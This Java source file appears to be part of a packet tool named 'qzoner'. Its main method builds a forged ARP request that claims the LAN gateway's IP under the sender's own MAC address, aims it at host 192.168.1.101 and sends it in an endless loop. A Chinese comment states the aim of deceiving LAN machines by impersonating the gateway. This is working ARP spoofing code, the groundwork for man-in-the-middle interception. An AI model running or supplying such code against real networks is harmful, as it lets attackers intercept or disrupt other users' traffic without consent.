package org.jasic.qzoner.core;
import cn.tisson.framework.interrupt.InterruptHandler;
import jpcap.packet.ARPPacket;
import jpcap.packet.TCPPacket;
import org.jasic.qzoner.core.entity.IpMacPair;
import org.jasic.qzoner.util.NetWorkUtil;
import org.jasic.qzoner.util.PacketGener;
import org.jasic.utils.SystemUtil;

import java.net.UnknownHostException;

import static org.jasic.utils.StringUtils.*;
/**
 * User: Jasic
 * Date: 13-9-11
 */
public class Client {

    private PacketSender sender;
    private PacketCaptor captor;

    public Client() {

        IpMacPair pair = new IpMacPair();
        pair.setMac("78-45-C4-05-80-1D");

        this.sender = new PacketSender(pair);
        this.captor = new PacketCaptor(pair);
    }


    public static void main(String[] args) {

        IpMacPair pair = new IpMacPair();
        pair.setMac("78-45-C4-05-80-1D");
        PacketSender sender = new PacketSender(pair);

        // 欺骗局域网内的机器（模拟网关）
        IpMacPair fakeGateWay = new IpMacPair();
        fakeGateWay.setIp(SystemUtil.getGateWayIp("192.168.1.100"));
//        fakeGateWay.setIp(("192.168.1.100"));
        fakeGateWay.setMac(pair.getMac());

        IpMacPair target = new IpMacPair();
        target.setIp("192.168.1.101");
        target.setMac("FF-FF-FF-FF-FF-FF");

        ARPPacket packet = null;
        try {
            packet = PacketGener.getArpReqPacket(fakeGateWay, target);
            packet.datalink = PacketGener.genEthpacket(NetWorkUtil.macStrToByte(fakeGateWay.getMac()),
                    NetWorkUtil.macStrToByte(target.getMac()));
        } catch (UnknownHostException e) {
            e.printStackTrace();
        }
        while (true) {
            System.out.println("Send-->" + fieldval2Map(packet, packet.getClass()));
            sender.send(packet);


        }
    }


}
